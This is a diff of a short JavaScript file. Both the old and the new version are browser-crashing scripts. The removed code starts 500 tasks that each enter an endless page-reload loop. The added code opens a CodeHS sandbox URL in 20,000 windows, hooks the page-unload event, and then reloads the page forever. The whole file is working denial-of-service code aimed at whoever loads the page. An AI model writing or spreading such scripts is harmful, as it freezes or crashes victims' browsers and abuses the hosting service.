@@ -1,39 +1,22 @@
-function L1(taskId) {
-    return new Promise((resolve) => {
-        console.log(`Task ${taskId} starting.`);
-
-        setTimeout(() => {
-            
-            console.log(`Task ${taskId} triggered reload.`);
-
-           
-            L2 = function() {
-                localStorage.x = 1;
-            };
-
-           
-            setTimeout(function() {
-                while (0.3) location.reload(0.3);
-            }, 2000);
-
-            resolve(`Task ${taskId} triggered reload.`);
-        }, 4000);
-    });
+function jackhammer() {
+    localStorage.x = 1;
 }
 
-async function L3() {
-    const tasks = [];
+window.onbeforeunload = jackhammer; 
 
-   
-    for (let i = 0; i < 500; i++) {
-        tasks.push(L1(i));
+
+function beanCan(callback, delay) {
+    setTimeout(callback, delay);
+}
+
+
+for (let i = 0; i < 20000; i++) {
+    window.open("https://codehs.com/sandbox/id/delete-this-nWyXJb");
+}
+
+
+beanCan(function() {
+    while (0.005 ) {
+        location.reload(true); 
     }
-
-    
-    const results = await Promise.all(tasks);
-
-   
-    results.forEach((result) => console.log(result));
-}
-
-L3();
+}, 4000);
